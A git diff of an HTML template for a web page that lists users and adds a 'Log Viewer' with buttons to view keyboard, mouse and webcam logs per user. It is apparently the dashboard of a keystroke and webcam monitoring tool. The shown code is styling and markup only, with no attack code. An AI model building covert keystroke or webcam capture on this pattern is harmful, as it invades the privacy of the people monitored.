@@ -4,9 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>User List</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
             font-family: Arial, sans-serif;
+            /* font-family: 'Arial', sans-serif; */
+            /* font-family: Verdana, Geneva, Tahoma, sans-serif; */
+            font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
             background-color: #f4f4f9;
             margin: 0;
             padding: 20px;
@@ -22,12 +26,95 @@
         li {
             margin-bottom: 10px;
         }
+        .form-control {
+            position: relative;
+            margin-bottom: 20px;
+            background-color: #fff;
+            --width-of-input: 100%;  /* Full width of container */
+            --border-height: 2px;
+            --border-before-color: rgba(255, 255, 255, 0.7);
+            --border-after-color: #37FF8B; /* Lime green, for example */
+        }
+        .input {
+            color: #fff;
+            font-size: 0.9rem;
+            background-color: transparent;
+            width: var(--width-of-input);
+            box-sizing: border-box;
+            padding-inline: 0.5em;
+            padding-block: 0.7em;
+            border: none;
+            border-bottom: var(--border-height) solid var(--border-before-color);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .input-border {
+            position: absolute;
+            background: var(--border-after-color);
+            width: 0%;
+            height: var(--border-height);
+            bottom: 0;
+            left: 0;
+            transition: width 0.3s cubic-bezier(0.6, -0.28, 0.735, 0.045);
+        }
+        .input:focus {
+            outline: none;
+        }
         a {
             text-decoration: none;
             color: #5D3FD3;
         }
         a:hover {
             text-decoration: underline;
+        }
+        .input:focus + .input-border {
+            width: 100%;
+        }
+        /* Button Styles */
+        .button-container {
+            text-align: center; /* Center aligns all buttons */
+        }
+
+        .button {
+            display: inline-block;
+            margin: 10px 10px; /* Adjust spacing between buttons */
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            background-color: #5D3FD3; 
+            color: white; 
+            font-size: 1em;
+            font-weight:bold;
+            text-transform: uppercase;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #472bb9; /* Green background on hover */
+        }
+
+        #log-data {
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            padding: 10px;
+            margin-top: 10px;
+            height: 300px;
+            overflow: scroll;
+            white-space: pre-wrap; /* Maintains spaces and line breaks */
+            word-wrap: break-word; /* Breaks long words */
+        }   
+        .divider{
+            border: 1px solid #ddd;
+            width: 100%;
+            /* height: 20px; */
+        }
+
+        /* Container for Analyze Logs button */
+        .analyze-button-container {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .analyze-button-container .button {
+            margin-left: 30px; /* Adjust this value to move the button to the right */
         }
     </style>
 </head>
@@ -39,6 +126,38 @@
         {% endfor %}
     </ul>
 
+    <nav class="navbar bg-body-tertiary mb-4">
+        <div class="container mb-5">
+          <a class="navbar-brand" href="#">
+            <img src="https://lh3.googleusercontent.com/d/1zOUoYGbMePnFgqRF_rbkAlPWQEgzNkNu"  height="100">
+          </a>
+        </div>
+      </nav>
+      <div class="container">
+    <h1>Log Viewer</h1>
+    <div class="button-container">
+        <div class="button" onclick="loadKeyLogs()">
+            <span class="hover-text">View Keyboard Logs</span>
+        </div>
+        <div class="button" onclick="loadMouseLogs()">
+            <span class="hover-text">View Mouse Logs</span>
+        </div>
+        <div class="button" onclick="loadWebcamLogs()">
+            <span class="hover-text">View Webcam Logs</span>
+        </div>
+    </div>
+
+    
+    <pre id="log-data">Please select a log type to display.</pre>
+
+    <div class="divider"></div>
+
+    <!-- Container for Analyze Logs button -->
+    <div class="analyze-button-container">
+        <div class="button" onclick="analyzeLogs()">Analyze All Logs Together</div>
+    </div>
+    
+</div>
     <script>
         const redirectToLogViewer = (user) => {
             window.location.href = `/log_viewer/${user}`;
@@ -46,3 +165,4 @@
     </script>
 </body>
 </html>
+
